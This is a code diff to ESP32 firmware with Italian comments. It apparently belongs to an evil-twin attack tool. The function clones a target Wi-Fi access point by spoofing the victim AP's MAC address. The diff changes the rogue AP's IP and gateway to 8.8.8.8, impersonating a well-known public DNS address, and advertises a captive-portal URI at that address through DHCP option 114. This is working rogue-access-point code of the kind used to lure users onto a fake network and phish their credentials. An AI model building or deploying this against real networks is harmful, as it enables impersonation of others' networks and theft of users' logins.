@@ -1,6 +1,7 @@
 #include "wifiSetup.h"
 #include <string.h>
 #include "esp_log.h"
+#include "esp_netif.h"
 #include "nvs_flash.h"
 #include "esp_mac.h"
 #include "esp_wifi.h"
@@ -72,8 +73,17 @@ void wifiSetupAP(void){ //avvia wifi in modalita' access point, clonando il bers
     uint8_t spoofed_mac[6]  = {0xFC, 0x40, 0x09, 0xDD, 0x0A, 0xF1};
     ESP_ERROR_CHECK(esp_wifi_set_mac(WIFI_IF_AP, spoofed_mac)); //spoof con macaddress AP vittima
 
+    ESP_ERROR_CHECK(esp_netif_dhcps_stop(ap_netif));
+
+    esp_netif_ip_info_t ip_info;
+    esp_netif_str_to_ip4("8.8.8.8", &ip_info.ip);
+    esp_netif_str_to_ip4("8.8.8.8", &ip_info.gw);
+    esp_netif_str_to_ip4("255.255.255.0", &ip_info.netmask);
+
+    ESP_ERROR_CHECK(esp_netif_set_ip_info(ap_netif, &ip_info));
+
     //dhcp setup per captive portal
-    const char* captiveportal_uri = "http://192.168.4.1"; //impostato con ip di default del softAP
+    const char* captiveportal_uri = "http://8.8.8.8"; //impostato con ip di default del softAP
 
     ESP_ERROR_CHECK(esp_netif_dhcps_option(
         ap_netif, 
@@ -85,6 +95,7 @@ void wifiSetupAP(void){ //avvia wifi in modalita' access point, clonando il bers
 
     ESP_LOGI(TAG, "Configurato DHCP Option 114 con URI: %s", captiveportal_uri);
 
+    ESP_ERROR_CHECK(esp_netif_dhcps_start(ap_netif));
     ESP_ERROR_CHECK(esp_wifi_start());
 
     ESP_LOGI(TAG, "wifi_init_softap finished. SSID:'%s'", wifi_config.ap.ssid);
